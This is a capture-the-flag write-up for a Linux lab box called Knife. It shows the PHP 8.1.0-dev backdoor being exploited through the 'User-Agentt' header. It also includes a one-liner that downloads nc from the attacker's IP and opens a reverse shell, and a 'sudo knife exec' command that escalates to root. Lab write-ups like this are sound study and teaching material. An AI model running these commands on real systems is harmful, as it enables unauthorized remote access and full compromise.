#Linux #php #CVE #backdoor #sudo #GTFOBins #chef

## Overview

Knife is an easy Linux box that's almost entirely about recognizing two known issues. The web server runs a backdoored development build of PHP (**PHP 8.1.0-dev**), giving instant unauthenticated RCE via a magic header. Root is a one-liner: `sudo` access to the `knife` Chef tool, which has a GTFOBins entry.

## Recon

The site is plain PHP on Apache, but Nikto caught the giveaway in a response header:

```
x-powered-by: PHP/8.1.0-dev
```

## Foothold

### PHP 8.1.0-dev Backdoor

> **The backdoor:** in 2021, PHP's git server was compromised and a malicious commit slipped into a dev build. It checks for a `User-Agentt` header (note the double "t") and executes its contents via `zend_eval_string`. So any request carrying that header runs PHP, and thus OS commands, with no authentication.

The [PoC](https://www.exploit-db.com/exploits/49933) automates it into an interactive shell:

```sh
python3 php.py
Enter the host url: http://10.129.24.169/
$ whoami
james
```

The restricted shell wouldn't `cd`, so I worked from `/tmp`, pulled my own `nc` binary, made it executable, and caught a full TTY-capable shell:

```sh
cd /tmp; wget http://10.10.14.126/nc; chmod +x nc; ./nc 10.10.14.126 443 -e /bin/bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### sudo knife, GTFOBins

```sh
sudo -l
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

> **What `knife` is:** the CLI for Chef, an infrastructure-automation platform. `knife exec` runs arbitrary Ruby, and when `knife` itself runs as root via sudo, that Ruby runs as root. GTFOBins documents the exact escape.

```sh
sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
```

## Root

Box rooted.

## Takeaways

- **Check response headers.** `PHP/8.1.0-dev` is a backdoored build with trivial unauth RCE via the `User-Agentt` header.
- **Restricted shells: pull a static `nc` and pivot to `/tmp`** when `cd` and built-ins misbehave.
- **GTFOBins for any sudo binary.** `knife exec` runs Ruby as root, a single command to a shell.
